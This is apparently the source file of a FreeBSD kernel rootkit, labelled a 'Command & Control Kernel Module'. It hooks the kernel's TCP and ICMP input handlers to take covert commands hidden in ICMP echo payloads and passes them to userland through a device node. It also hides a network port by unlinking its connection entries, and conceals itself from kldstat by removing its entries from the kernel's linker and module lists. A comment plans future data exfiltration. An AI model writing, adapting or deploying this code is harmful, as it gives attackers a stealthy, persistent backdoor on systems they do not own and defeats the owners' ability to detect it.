/*
 * =================================================================================
 *
 *       Filename:  control_module.c
 *
 *    Description:  FreeBSD Command & Control Kernel Module --
 *
 *        Version:  1.0
 *        Created:  2012-05-30 01:13:16
 *       Revision:  none
 *       Compiler:  clang
 *
 *         Author:  Steffen L. Norgren (http://nein.ca), ironix@nein.ca
 *        Company:  Esurient Systems Inc.
 *
 * =================================================================================
 */
#include "control_module.h"

/* character device functions */
static int cdev_open(struct cdev *dev, int flag, int otyp, struct thread *td)
{
    return 0;
}

static int cdev_close(struct cdev *dev, int flag, int otyp, struct thread *td)
{
    return 0;
}

static int cdev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td)
{
    return 0;
}


static int cdev_write(struct cdev *dev, struct uio *uio, int ioflag)
{
    return 0;
}

/* this does the magic: pass the cli_cmd to userland component */
static int cdev_read(struct cdev *dev, struct uio *uio, int ioflag)
{
	size_t slen;
    
    sx_xlock(&kld_sx);
    copystr(&cli_cmd, uio->uio_iov->iov_base, strlen(cli_cmd) + 1, &slen); /* done! */

    /* after reading cli_cmd can be cleared */
    bzero(cli_cmd, 256);
    sx_xunlock(&kld_sx);

#if DEBUG
    printf("Read %zd bytes from device /dev/%s\n", slen, cdev_devsw.d_name);
#endif

    return 0;
}

/* Kind of ugly hack to hide all new connections */
static void tcp_input_hook(struct mbuf *m, int off0) {
	struct tcphdr *tcp_header = NULL;
	struct ip *ip_header = NULL;

	ip_header = mtod(m, struct ip *);
	tcp_header = (struct tcphdr *)((caddr_t)ip_header + off0);
	
	if (ntohs(tcp_header->th_dport) == HIDE_PORT_TEST)
		hide_port(HIDE_PORT_TEST);
	
	tcp_input(m, off0);
}

/* handle incoming ICMP echo packets */
static void icmp_input_hook(struct mbuf *m, int off0) {
	struct icmp *icmp_header;
	char icmp_msg[256 + 1]; /* TODO: Encrypt this */
	int count;
	size_t slen;

	m->m_len -= off0;
	m->m_data += off0;

	icmp_header = mtod(m, struct icmp *);

	m->m_len += off0;
	m->m_data -= off0;

	/* make sure it is an ICMP echo packet with actual data */
	if (icmp_header->icmp_type == ICMP_ECHO && icmp_header->icmp_data != NULL) {
		bzero(icmp_msg, 256);
		copystr(icmp_header->icmp_data, icmp_msg, 256, &slen);

		/* TODO: Create a heirarchy of commands for different types of data.
		   For instance, a command for HTTP requests, data exfiltration, etc... */

		/* Command Line Interface: __cmd; */
		if (strlen(icmp_msg) > 2) {
			if (icmp_msg[0] == '_' && icmp_msg[1] == '_') {
				count = 2;

				sx_xlock(&kld_sx);

				bzero(cli_cmd, 256);
				while (icmp_msg[count] != ';' && count < 256) {
					cli_cmd[count - 2] = icmp_msg[count];
					count++;
				}

				cli_cmd[count] = '\0'; /* terminate string */
				sx_xunlock(&kld_sx);

				/* TODO: send to cdev */
#if DEBUG
				printf("ICMP packet -> cli_cmd: %s\n", cli_cmd);
#endif
			}
		}
	}

	icmp_input(m, off0);
}

/* System call to hide an open local network port. */
static void hide_port(int lport)
{
    struct inpcb *inpb;

    INP_INFO_WLOCK(&tcbinfo);

    /* Iterate through the TCP-based inpcb list */
    LIST_FOREACH(inpb, tcbinfo.ipi_listhead, inp_list) {
        if (inpb->inp_vflag & INP_TIMEWAIT)
            continue;

		/* lock writing to the kernel struct */
        INP_WLOCK(inpb);

        /* Check to see if this is the port we want hidden */
        if (lport == ntohs(inpb->inp_inc.inc_ie.ie_lport))
            LIST_REMOVE(inpb, inp_list);

		/* unlock writing to the kernel struct */
        INP_WUNLOCK(inpb);
    }

    INP_INFO_WUNLOCK(&tcbinfo);
}

static void hide_module(void)
{
    struct linker_file *lf;
    struct module *mod;

    /* Giant lock is used in the kernel to provice concurrency control */
    mtx_lock(&Giant);
    sx_xlock(&kld_sx);

    /*
     * Decrement the current kernel image's reference count. This reduces suspicion
     * when executing 'kldstat', for if another kernel module is loaded, there will
     * be a gap in the list of ids.
     */
    (&linker_files)->tqh_first->refs--;

    /*
     * Iterate throught he linker_files list, looking for MODULE_FILE. If found,
     * decrement the next_file_id and remove from the list.
     */
    TAILQ_FOREACH(lf, &linker_files, link) {
        if (strcmp(lf->filename, MODULE_FILE) == 0) {
            next_file_id--;
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }

    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    /* 
     * Shared/exclusive locks are used to protect data that are read far more
     * often than they are written.
     */
    sx_xlock(&modules_sx);

    /*
     * Iterate through the module list, looking for MODULE_NAME. If found,
     * decrement nextid and remove from the list.
     */
    TAILQ_FOREACH(mod, &modules, link) {
        if (strcmp(mod->name, MODULE_NAME) == 0) {
            nextid--;
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
    }

    sx_xunlock(&modules_sx);
}

static int module_events(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch (cmd) {
        case MOD_LOAD:
#if DEBUG
            uprintf("Module %s loaded.\n", MODULE_FILE);
#endif

            if (MODULE_HIDE) {
#if DEBUG
                printf("Hiding %s module.\n", MODULE_FILE);
#endif
                hide_module();
            }
			sx_init(&kld_sx, "kernel_lock"); /* avoiding race conditions */
			inetsw[ip_protox[IPPROTO_TCP]].pr_input = tcp_input_hook;
			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
			sdev = make_dev(&cdev_devsw, 0, UID_ROOT, GID_WHEEL, 0600, "cc");
            break;

        case MOD_UNLOAD:
#if DEBUG
            printf("Module %s unloaded.\n", MODULE_FILE);
#endif
			sx_destroy(&kld_sx);
			inetsw[ip_protox[IPPROTO_TCP]].pr_input = tcp_input;
			inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
			destroy_dev(sdev);
            break;

        default:
            error = EOPNOTSUPP;
            break;
    }

    return error;
}

static moduledata_t control_module_mod = {
    MODULE_NAME,    /* module name */
    module_events,  /* event handler */
    NULL            /* extra data */
};

DECLARE_MODULE(control_module, control_module_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
